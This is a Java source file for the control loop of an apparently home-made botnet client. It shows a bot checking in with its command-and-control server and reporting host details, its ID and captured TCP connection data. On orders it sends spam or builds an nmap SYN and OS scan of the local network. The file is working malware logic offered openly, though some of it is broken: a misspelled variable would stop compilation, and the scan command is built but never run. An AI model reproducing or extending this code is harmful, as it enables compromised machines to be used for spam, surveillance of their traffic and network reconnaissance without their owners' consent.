
package atrax_bot;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.Iterator;

public class bot_actions {

 /**
 *  the main actions the bot will execute
 */
    public enum ccResponses { start, sleep, noResponse, spam, scan };
    
    public static void main(String[] args) {
        
        /************************
         * BOT IN INIT MODE 
         ************************/
        
        /**
         * check the arguments
         * given to the bot at bot startup
         * currently, I have only "debug"
         */
        
        Boolean debug = false;
        for (int i = 0; i < args.length; i++){
            if (args[i].equals("-debug")) {
                debug = true;
            }
        }
        
        // create a bot object
        bot theBot = new bot();
        if (debug) {
            System.out.println("New bot is born!");
        }
        
        // SSL cert trust setup
        // on my https server
        new CC_connector().setupTrust();
        
        // INTERACTION BETWEEN BOT AND C&C
        // using reports
        // create report object
        CC_DataExchanger theReport = new CC_DataExchanger();
        
        // replies from the CC stored here
        String CC_Reply;
        
        Boolean botRunning = false;
        while (!botRunning) {
            // first connection attempt
            CC_Reply = theReport.makeInitialConnection(theBot, debug);
             
            switch (ccResponses.valueOf(CC_Reply)) {
                case start:
                    botRunning = true;
                    if (debug) System.out.println("Received start command, STARTING!!");
                    break;
                case sleep:
                    botRunning = false;
                    if (debug) System.out.println("Received sleep command, SLEEPING!!");
                    break;
                case noResponse:
                    if (debug) System.out.println("No response from master, SLEEPING!!");
                    break;
                default:
                    if (debug) System.out.println("My master responded with" +
                            CC_Reply + ", I DO NOT UNDERSTAND THAT COMMAND."
                    );
            }
            
            if (!botRunning) {
                Tools.sleep(theBot.checkCommandTime, theBot.checkCommandTimeRandom, debug);
                
            }
        }
        
        /********************
         * BOT IN START MODE
         ********************/
        theBot.status = "start";
        
        // generate the bot ID
        if(debug) System.out.println("Generating ID for the bot...");
        theBot.generateBotID();
        if(debug) System.out.println("THis bot's ID is" + theBot.botID);
        
        // get host details 
        if (debug) System.out.println("Fetching host details...");
        
        // send report to the CC about host
        // CC will reply with our public IP addr
        CC_Reply = theReport.sendHostDetails(theBot, debug);
        
        // if the server replies to that 
        // we store the info
        if (CC_Reply != null) {
            try {
                theBot.publicIpAddr = InetAddress.getByName(CC_Reply);
                if(debug) System.out.println("The master informed me, that my public IP is " + 
                        theBot.publicIpAddr + "."
                        );
            } catch(UnknownHostException e) {
                // exception catcher
                e.printStackTrace();
            }
        }
        
        /**********************
         * BOT IN COMMAND MODE
         *********************/
        
        theBot.status = "command";
        
        if(debug) System.out.println("Starting listening thread...");
        
        NICListener listenerThread = new NICListener();
        
        listenerThread.start();
        
        while(true) {
            // gather TCP connection data
            String tcpConnections = "";
            Iterator<String> itr = listenerThread.connectionTriplets.iterator();
            while(itr.hasNext()){
                tcpConnections += itr.next();
            }
            
            // post ongoing reports to the CC
            // listen to further orders
            CC_Reply = theReport.sendOngoingReport(theBot, tcpConnections, debug);
            
            // TYPES OF ORDERS
            switch(ccResponses.valueOf(CC_Reply)) {
                
                /**************************
                 * BOT WILL SEND SPAM
                 **************************/
                case spam:
                    if(debug) System.out.println("Received spam command. Requesting spam parameters...");
                    Mailer theMailer = new Mailer(theBot);
                    theBot.status = "spam";
                    
                    // get spam parameters from the CC
                    CC_Reply = CC_DataExchanger.requestSpamParameters(theBot, debug);
                    
                    if (CC_Reply != null && CC_Reply.contains("<spam>")) {
                        if(debug) System.out.println("SENDING SPAM!!");
                        SpamModule.send(CC_Reply, theMailer, debug);
                        
                        // return back to command mode
                        theBot.status = "command";
                    } else {
                        if (debug) {
                            System.out.println("ERROR - cannot send spam."
                                    + "C&C returned null or wrong parameters.");
                        }
                    }
                    break;
                
                /***************************
                 * BOT WILL SCAN THE SYSTEM
                 ***************************/
                case scan:
                    if(debug) System.out.println("Received scan command.");
                    theBot.status = "scan";
                    
                    // pause the tcp listening thread
                    if(debug) System.out.println("Pausing the TCP listening thread...");
                    synchronized (listenerThread) {
                        listenerThread.pleaseWait = true;
                    }
                    
                    // the nmap scanning command passed in 
                    // nmap -sS -O 
                    String nmapCommand = "nmap -sS -O " +
                            theBot.hostNetParams.primaryInterfaceNetwork
                            .toString().replace("/", "") +
                            HostNetParams.toCIDR(theBot.hostNetParams
                            .primaryInterfaceSubnetMask);
                    if(debug) {
                        System.out.println("Currently using this command:" + 
                                nmapCommand);
                    }
                    
                    // restart the TCP listening thread
                    synchronized(listenerTHread) {
                        listenerThread.pleaseWait = false;
                    }
                    
                    theBot.status = "command";
                    break;
                    
                    /***********************
                     * THE BOT IS ASLEEP
                     ***********************/
                    
                case sleep:
                    if(debug) System.out.println("Received sleep command.");
                    Tools.sleep(theBot.checkCommandTime, theBot.checkCommandTimeRandom, debug);
                    break;
                
                default:
                    if(debug) System.out.println("ERROR - could not understand command " + 
                            CC_Reply);
                    break;
            }
        }
    }
    
}
